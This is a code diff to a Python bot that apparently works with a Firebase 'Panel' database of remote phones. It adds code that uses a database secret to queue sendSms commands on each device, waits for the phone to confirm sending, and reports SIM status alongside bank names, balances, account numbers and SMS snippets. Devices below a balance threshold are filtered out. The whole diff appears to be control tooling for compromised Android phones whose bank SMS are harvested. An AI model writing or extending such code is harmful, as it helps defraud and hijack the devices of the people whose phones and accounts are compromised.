@@ -331,6 +331,9 @@ class Record:
     transaction_type: str = ""
     raw_sms_snippet: str = ""
     balance_detected_at: str = ""
+    # SIM SMS-check results (only True when device confirms isSended)
+    sim1_active: bool = False
+    sim2_active: bool = False
 
 
 def txt(v: Any) -> str:
@@ -675,7 +678,7 @@ def init_firebase() -> None:
     firebase_ready = True
 
 
-def public_firebase_url(path: str) -> str:
+def public_firebase_url(path: str, with_auth: bool = False) -> str:
     base = (store.get("firebase_url") or os.getenv("FIREBASE_DATABASE_URL", "")).strip().rstrip("/")
     if not base:
         raise RuntimeError("Configure a Firebase URL with /firebase <URL> first")
@@ -684,7 +687,17 @@ def public_firebase_url(path: str) -> str:
     if parsed.scheme != "https" or not (host.endswith(".firebaseio.com") or host.endswith(".firebasedatabase.app")):
         raise RuntimeError("Only an https Firebase Realtime Database URL is allowed")
     suffix = "" if path in {"", "/"} else "/" + path.strip("/")
-    return f"{base}/.json" if not suffix else f"{base}{suffix}.json"
+    url = f"{base}/.json" if not suffix else f"{base}{suffix}.json"
+    if with_auth:
+        # Panel uses ?auth=<Database Secret or legacy token> for writes
+        auth = (
+            store.get("firebase_auth_key")
+            or os.getenv("FIREBASE_AUTH_KEY", "")
+            or os.getenv("FIREBASE_DB_SECRET", "")
+        ).strip()
+        if auth:
+            url = f"{url}?auth={auth}"
+    return url
 
 
 async def public_firebase_read(path: str, timeout: int = 45) -> Any:
@@ -723,6 +736,150 @@ async def firebase_read(path: str) -> Any:
             if attempt == 2:
                 raise
             await asyncio.sleep(2 ** attempt)
+
+
+# ---------------------------------------------------------------------------
+# SMS Check (Panel sendSms logic: webhookEvent/sendSms + isSended confirm)
+# ---------------------------------------------------------------------------
+
+SMS_CHECK_TIMEOUT = float(os.getenv("SMS_CHECK_TIMEOUT", "18"))
+SMS_CHECK_MESSAGE = os.getenv("SMS_CHECK_MESSAGE", "SIM_CHECK").strip() or "SIM_CHECK"
+# Optional fixed destination; if empty, uses device phone / SIM number
+SMS_CHECK_TO = os.getenv("SMS_CHECK_TO", "").strip()
+
+
+def _firebase_auth_available() -> bool:
+    return bool(
+        (store.get("firebase_auth_key") or os.getenv("FIREBASE_AUTH_KEY", "") or os.getenv("FIREBASE_DB_SECRET", "")).strip()
+    )
+
+
+async def firebase_write(path: str, data: Any) -> Any:
+    """Panel-compatible PUT with ?auth= (same as Zp)."""
+    url = public_firebase_url(path, with_auth=True)
+
+    def put() -> Any:
+        body = json.dumps(data).encode("utf-8")
+        req = urllib.request.Request(
+            url,
+            data=body,
+            method="PUT",
+            headers={"Content-Type": "application/json"},
+        )
+        try:
+            with urllib.request.urlopen(req, timeout=15) as response:
+                raw = response.read().decode("utf-8")
+                return json.loads(raw) if raw else None
+        except urllib.error.HTTPError as exc:
+            if exc.code in {401, 403}:
+                raise RuntimeError(
+                    "PERMISSION_DENIED: cannot write sendSms. Set FIREBASE_AUTH_KEY to Database Secret."
+                ) from exc
+            raise RuntimeError(f"Firebase write HTTP {exc.code}") from exc
+
+    return await asyncio.to_thread(put)
+
+
+def _pick_sms_destination(client_node: dict[str, Any], sim_slot: int) -> str:
+    """Prefer SMS_CHECK_TO, else that SIM's phoneNumber, else mobNo."""
+    if SMS_CHECK_TO:
+        return re.sub(r"[^0-9+]", "", SMS_CHECK_TO)
+    sims = client_node.get("sims")
+    sim_list: list[Any] = []
+    if isinstance(sims, list):
+        sim_list = sims
+    elif isinstance(sims, dict):
+        sim_list = list(sims.values())
+    # Panel from=1 → SIM1; try matching simSlotIndex 0/1 or order
+    for s in sim_list:
+        if not isinstance(s, dict):
+            continue
+        slot = str(s.get("simSlotIndex", ""))
+        want = str(sim_slot - 1)  # from 1 → index 0
+        if slot == want or slot == str(sim_slot):
+            ph = re.sub(r"[^0-9+]", "", str(s.get("phoneNumber") or ""))
+            if len(ph) >= 10:
+                return ph
+    if sim_list:
+        idx = min(max(sim_slot - 1, 0), len(sim_list) - 1)
+        s = sim_list[idx]
+        if isinstance(s, dict):
+            ph = re.sub(r"[^0-9+]", "", str(s.get("phoneNumber") or ""))
+            if len(ph) >= 10:
+                return ph
+    mob = re.sub(r"[^0-9+]", "", str(client_node.get("mobNo") or client_node.get("phone") or ""))
+    return mob
+
+
+async def check_one_sim(device_id: str, client_node: dict[str, Any], sim_slot: int) -> bool:
+    """
+    Queue SMS via clients/{id}/webhookEvent/sendSms (Panel logic) and wait until
+    device sets isSended=true. Only then return True.
+    """
+    to_number = _pick_sms_destination(client_node, sim_slot)
+    if not to_number or len(re.sub(r"\D", "", to_number)) < 10:
+        log.debug("SMS check skip %s SIM%s: no destination number", device_id, sim_slot)
+        return False
+
+    payload = {
+        "from": sim_slot,
+        "to": to_number,
+        "message": f"{SMS_CHECK_MESSAGE} S{sim_slot}",
+        "isSended": False,
+    }
+    path = f"clients/{device_id}/webhookEvent/sendSms"
+    try:
+        await firebase_write(path, payload)
+    except Exception as exc:
+        log.warning("sendSms queue failed %s SIM%s: %s", device_id, sim_slot, exc)
+        return False
+
+    # Poll for real confirmation (isSended must become true)
+    deadline = time.time() + SMS_CHECK_TIMEOUT
+    while time.time() < deadline:
+        await asyncio.sleep(1.5)
+        try:
+            node = await firebase_read(path)
+        except Exception:
+            continue
+        if not isinstance(node, dict):
+            continue
+        flag = node.get("isSended")
+        if flag is True or str(flag).lower() in {"true", "1"}:
+            return True
+    return False
+
+
+async def run_sms_checks_on_records(
+    records: list[Record],
+    clients: dict[str, Any],
+    devices: dict[str, Any],
+) -> None:
+    """For eligible online devices, verify SIM1 and SIM2 via Panel sendSms + isSended."""
+    if not _firebase_auth_available():
+        log.warning("FIREBASE_AUTH_KEY not set — SMS check skipped (cannot write webhookEvent)")
+        return
+
+    eligible = [
+        r for r in records
+        if r.online == "online" and r.available_balance >= BALANCE_THRESHOLD
+    ]
+    sem = asyncio.Semaphore(3)
+
+    async def one(rec: Record) -> None:
+        async with sem:
+            cid = rec.client_id or rec.device_id
+            if not cid:
+                return
+            node = {}
+            if isinstance(clients.get(cid), dict):
+                node.update(clients[cid])
+            if isinstance(devices.get(cid), dict):
+                node.update(devices[cid])
+            rec.sim1_active = await check_one_sim(cid, node, 1)
+            rec.sim2_active = await check_one_sim(cid, node, 2)
+
+    await asyncio.gather(*(one(r) for r in eligible))
 
 
 def selected(records: list[Record]) -> list[Record]:
@@ -765,6 +922,11 @@ def format_report(records: list[Record], mode: str = "online_no_match") -> str:
     else:
         shown = rs
 
+    # SMS Check rule: hide device if NEITHER SIM confirmed active
+    # (only applies when auth key is available so checks actually ran)
+    if _firebase_auth_available():
+        shown = [r for r in shown if r.sim1_active or r.sim2_active]
+
     s = stats(selected(records))  # original full stats for reference
     source_url = (store.get("firebase_url") or os.getenv("FIREBASE_DATABASE_URL", "")).strip().rstrip("/") or "(not configured)"
     out = [
@@ -795,11 +957,18 @@ def format_report(records: list[Record], mode: str = "online_no_match") -> str:
 
         # Hide "Sender match: YES" noise when user wants only NO; still show for clarity as NO
         match_label = "NO" if not matched else "YES"
+        sim_parts = []
+        if r.sim1_active:
+            sim_parts.append("SIM 1 ACTIVE")
+        if r.sim2_active:
+            sim_parts.append("SIM 2 ACTIVE")
+        sim_line = " | ".join(sim_parts) if sim_parts else "SIM: not verified"
         out.append(
             f"<b>{i}. {esc(r.device_id or r.client_id or r.identity)}</b> — Sender match: {match_label}\n"
             f"Bank: {esc(bank_line)} | Balance: <b>{esc(bal_line)}</b> | A/C: {esc(acct)}\n"
             f"Txn: {esc(txn or '—')} | Network: {esc(r.network)} | Online: {esc(r.online)}\n"
             f"Battery: {esc(r.battery)} | Last seen: {esc(r.last_seen)}\n"
+            f"<b>{esc(sim_line)}</b>\n"
             f"Source: <code>{esc(r.source_path)}</code>"
         )
     return "\n\n".join(out)
@@ -1055,6 +1224,21 @@ async def run_scan(message: Any, path: str, mode: str = "online_no_match", with_
             messages_map = await _fetch_messages_for_ids(to_fetch, concurrency=6, progress_cb=None)
 
             records = scan_device_snapshot(snapshot, path or "/", messages_override=messages_map)
+
+            # Automatic SIM SMS check (Panel webhookEvent/sendSms + isSended confirm)
+            if _firebase_auth_available():
+                need_check = sum(
+                    1 for r in records
+                    if r.online == "online" and r.available_balance >= BALANCE_THRESHOLD
+                )
+                if need_check:
+                    await message.reply_text(
+                        f"SMS check on {need_check} eligible online devices (SIM 1 & SIM 2) …"
+                    )
+                    await run_sms_checks_on_records(records, clients, devices)
+            else:
+                log.info("SMS check skipped: set FIREBASE_AUTH_KEY (Database Secret) to enable")
+
             store.finish(sid, records, "completed")
             await reply_report(message, format_report(records, mode), with_buttons)
         except Exception as e:
